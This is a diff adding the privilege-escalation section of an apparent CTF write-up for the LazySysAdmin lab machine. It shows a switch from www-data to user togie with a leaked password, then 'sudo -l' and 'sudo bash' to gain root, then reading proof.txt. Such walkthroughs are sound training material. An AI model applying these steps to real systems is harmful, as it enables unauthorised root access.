@@ -189,9 +189,60 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## 4.Privilege Escalation
 
+navigate to `/home` and you see user `togie`.
+
+change user to togie and privide the password `12345` we found in deets.txt previously :
+
+```bash
+www-data@LazySysAdmin:/var/www/html$ su togie
+su togie
+Password: 12345
+
+togie@LazySysAdmin:/var/www/html$
+```
+
+check the sudo permissions :
+
+```bash
+togie@LazySysAdmin:/var/www/html$ sudo -l
+Matching Defaults entries for togie on LazySysAdmin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User togie may run the following commands on LazySysAdmin:
+    (ALL : ALL) ALL
+
+togie@LazySysAdmin:/var/www/html$ sudo bash
+
+root@LazySysAdmin:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@LazySysAdmin:/var/www/html# cd /root
+
+root@LazySysAdmin:/root# cat proof.txt
+WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
+
+
+Well done :)
+
+Hope you learn't a few things along the way.
+
+Regards,
+
+Togie Mcdogie
 
 
 
+
+Enjoy some random strings
+
+WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
+2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
+pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
+bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
+```
+
+this is how you can become root on this machine :)
 
 
 
